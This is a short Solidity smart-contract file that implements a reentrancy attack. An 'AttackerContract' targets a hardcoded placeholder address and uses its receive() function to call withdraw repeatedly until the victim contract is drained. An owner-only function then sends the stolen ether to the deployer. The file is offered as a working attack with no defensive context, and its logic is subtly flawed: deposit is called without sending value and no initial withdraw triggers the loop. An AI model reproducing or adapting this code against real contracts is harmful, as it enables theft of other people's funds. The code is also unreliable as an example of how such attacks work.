// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancyVulnerable {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract AttackerContract {
    IReentrancyVulnerable public vulnerableContract;
    address public owner;

    constructor() { 
        vulnerableContract = IReentrancyVulnerable(0x7a46e70000000000000000000000000000000000);
        owner = msg.sender;
    }

    function startAttack(uint256 amount) external {
        require(address(this).balance >= amount, "Not enough balance");
        vulnerableContract.deposit(amount);
    }

    // Fallback function -> trigger withdrawal until drained
    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}